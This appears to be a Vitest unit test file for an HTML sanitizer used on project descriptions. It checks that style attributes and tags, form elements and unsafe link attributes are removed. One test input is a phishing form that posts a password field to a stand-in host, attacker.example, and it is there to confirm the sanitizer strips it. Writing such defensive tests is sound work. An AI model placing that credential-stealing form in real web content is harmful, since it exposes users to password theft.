// @vitest-environment jsdom
// happy-dom breaks DOMPurify (empty nodeName via Node.prototype)
import {describe, it, expect} from 'vitest'
import {sanitizeProjectDescription} from './sanitizeProjectDescription'

describe('sanitizeProjectDescription', () => {
	it('drops style attributes', () => {
		const html = sanitizeProjectDescription('<p style="position:fixed;inset:0">x</p>')

		expect(html).toBe('<p>x</p>')
	})

	it('drops style tags', () => {
		const html = sanitizeProjectDescription('<p>x</p><style>body{background:red}</style>')

		expect(html).toBe('<p>x</p>')
	})

	it('drops form elements', () => {
		const html = sanitizeProjectDescription(
			'<form action="//attacker.example/steal" method="post"><input name="password" type="password"><select><option>a</option></select><textarea>b</textarea><button>Confirm</button></form>',
		)

		expect(html).not.toMatch(/<(form|input|button|select|textarea)/)
		expect(html).not.toContain('attacker.example')
	})

	it('forces noopener on links with a target', () => {
		const html = sanitizeProjectDescription('<a href="https://example.com" target="_blank" rel="opener">x</a>')

		expect(html).toBe('<a href="https://example.com" target="_blank" rel="noopener noreferrer">x</a>')
	})

	it('keeps regular formatting', () => {
		const html = sanitizeProjectDescription('<p><strong>a</strong> <em>b</em></p><ul><li>c</li></ul>')

		expect(html).toBe('<p><strong>a</strong> <em>b</em></p><ul><li>c</li></ul>')
	})
})
